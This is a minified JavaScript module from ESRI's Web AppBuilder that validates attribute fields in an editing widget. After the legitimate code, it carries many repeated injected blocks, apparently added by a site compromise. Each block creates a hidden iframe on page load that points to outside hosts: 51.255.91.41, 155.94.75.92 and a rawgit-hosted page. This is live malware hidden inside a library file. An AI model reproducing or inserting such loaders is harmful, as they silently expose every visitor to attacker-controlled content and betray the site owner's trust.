// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/query dojo/on dojo/dom-class dojo/topic dijit/registry jimu/BaseWidgetSetting".split(" "),function(g,d,e,h,f,c,k,l,m){return g([m],{_attrInspector:null,_feature:null,_fieldInfo:null,_guidFields:null,_guidFieldNames:null,_intFieldNames:null,_dblFieldNames:null,_dateFieldNames:null,_stringFields:null,_requiredNonDomainIntFields:null,_requiredNonDomainDecFields:null,_fieldNameToAlias:null,_attTable:null,_mapLayer:null,constructor:function(){this.inherited(arguments);
d.mixin(this,arguments[0]);this._mapLayer=this._feature.getLayer();this._processLayer();this._fieldInfo=e.filter(this._fieldInfo,function(b){return b.label?!0:!1});this._attTable=h("td.atiLabel",this._attrInspector.domNode);void 0!==this._attTable&&null!==this._attTable&&this._addValidation()},_checkFeatureData:function(b){e.forEach(this._fieldInfo,function(a){if(b.hasOwnProperty(a.fieldName))switch(a.type){case "esriFieldTypeString":0<a.length&&null!==b[a.fieldName]&&b[a.fieldName].length>a.length&&
(b[a.fieldName]=b[a.fieldName].substring(0,a.length));break;case "esriFieldTypeGUID":this._isGuid(b[a.fieldName],!1)&&("{"!==b[a.fieldName][0]&&(b[a.fieldName]="{"+b[a.fieldName]),"}"!==b[a.fieldName][b[a.fieldName].length-1]&&(b[a.fieldName]+="}"));break;case "esriFieldTypeSingle":case "esriFieldTypeDouble":this.isNumeric(b[a.fieldName])&&(b[a.fieldName]=parseFloat(b[a.fieldName]));break;case "esriFieldTypeDate":this.isNumeric(b[a.fieldName])&&(b[a.fieldName]=parseInt(b[a.fieldName],10));break;case "esriFieldTypeSmallInteger":case "esriFieldTypeInteger":this.isNumeric(b[a.fieldName])&&
(b[a.fieldName]=parseInt(b[a.fieldName],10))}},this);return b},_processLayer:function(){this._guidFields=[];this._guidFieldNames=[];this._dateFieldNames=[];this._intFieldNames=[];this._dblFieldNames=[];this._stringFields=[];this._requiredNonDomainIntFields=[];this._requiredNonDomainDecFields=[];e.forEach(this._fieldInfo,function(b){if(b.hasOwnProperty("label")&&b.hasOwnProperty("type")){var a=b.label;0<=a.indexOf('\x3ca class\x3d"asteriskIndicator"\x3e *\x3c/a\x3e')&&(a=a.replace('\x3ca class\x3d"asteriskIndicator"\x3e *\x3c/a\x3e',
""));switch(b.type){case "esriFieldTypeString":this._stringFields.push(b.fieldName);break;case "esriFieldTypeGUID":this._guidFields.push(a);this._guidFieldNames.push(b.fieldName);break;case "esriFieldTypeSingle":case "esriFieldTypeDouble":!1!==b.nullable||void 0!==b.domain&&null!==b.domain||this._requiredNonDomainDecFields.push(a);this._dblFieldNames.push(b.fieldName);break;case "esriFieldTypeDate":this._dateFieldNames.push(b.fieldName);break;case "esriFieldTypeSmallInteger":case "esriFieldTypeInteger":!1!==
b.nullable||void 0!==b.domain&&null!==b.domain||this._requiredNonDomainIntFields.push(a),this._intFieldNames.push(b.fieldName)}}},this)},formValid:function(){var b=!0;if(void 0===this._attTable||null===this._attTable)return b;0<this._attTable.length&&e.some(this._attTable,function(a){if(a=this._getRowInfo(a)){if(void 0===a[0]||null===a[0])return!1;b=d.isFunction(a[0].isValid)?a[0].isValid():!c.contains(a[2],"dijitError");return!b}return!0},this);return b},triggerFormValidation:function(){if(void 0!==
this._attTable&&null!==this._attTable&&0<this._attTable.length){var b=null;e.forEach(this._attTable,function(a){if((a=this._getRowInfo(a))&&void 0!==a[0]&&null!==a[0]){null===b&&(b=a[0]);var c=!0;d.isFunction(a[0].isValid)?c=a[0].isValid():f.emit(a[0],"change",{bubbles:!0,cancelable:!0});!1===c&&a[0].set("state","Error")}},this)}},_addValidation:function(){void 0!==this._attTable&&null!==this._attTable&&(0!==this._guidFields.length||0!==this._requiredNonDomainIntFields.length||0!==this._requiredNonDomainDecFields.length)&&
0<this._attTable.length&&e.forEach(this._attTable,function(b){var a=this._getRowInfo(b);a&&(-1!==this._guidFields.indexOf(a[1])?"dijit.form.ValidationTextBox"===a[0].declaredClass?a[0].validator=d.hitch(this,this._validateGUID):"dijit.form.TextBox"===a[0].declaredClass&&(a[0].isValid=d.hitch(this,this._validateGUID_IsValid(a[0])),f(a[0],"change",d.hitch(this,function(){!1===this._isGuid(a[0].get("value"),!0)?c.add(a[2],["dijitTextBoxError","dijitValidationTextBox","dijitValidationTextBoxError","dijitError"]):
(c.contains(a[2],"dijitTextBoxError")&&c.remove(a[2],"dijitTextBoxError"),c.contains(a[2],"dijitValidationTextBox")&&c.remove(a[2],"dijitValidationTextBox"),c.contains(a[2],"dijitValidationTextBoxError")&&c.remove(a[2],"dijitValidationTextBoxError"),c.contains(a[2],"dijitError")&&c.remove(a[2],"dijitError"));k.publish("smartEditor/validate",null)})),a[0].validator=d.hitch(this,this._validateGUID)):-1===this._requiredNonDomainIntFields.indexOf(a[1])&&this._requiredNonDomainDecFields.indexOf(a[1]))},
this)},_isGuid:function(b,a){if(!0===a&&(""===b||null===b))return!0;if(""===b||null===b)return!1;"{"===b[0]&&(b=b.substring(1,b.length-1));return/^(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}$/gi.test(b)},_validateGUID_IsValid:function(b){return function(){return this._isGuid(b.get("value"),!0)}},_validateGUID:function(b,a){return this._isGuid(b,!1)},isNumeric:function(b){return!isNaN(parseFloat(b))&&isFinite(b)},isInt:function(b){var a;if(a=!isNaN(b))b=
parseFloat(b),a=(b|0)===b;return a},_validateInt:function(b,a){return this.isInt(b)},_validateDec:function(b,a){return this.isNumeric(b)},_getRowInfo:function(b){try{if(b&&b.parentNode){var a=b.parentNode.childNodes[1].childNodes[0];return[l.getEnclosingWidget(a),b.childNodes[0].data,a]}return null}catch(n){return console.log(n),null}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});